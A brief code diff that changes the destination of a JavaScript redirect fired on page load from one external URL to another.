@@ -3,7 +3,7 @@
   window.addEventListener(
     'load',
     () => {
-      window.location = 'https://awlo.org/500/'
+      window.location = 'https://graciathearts.com/models/'
     },
     false
   )
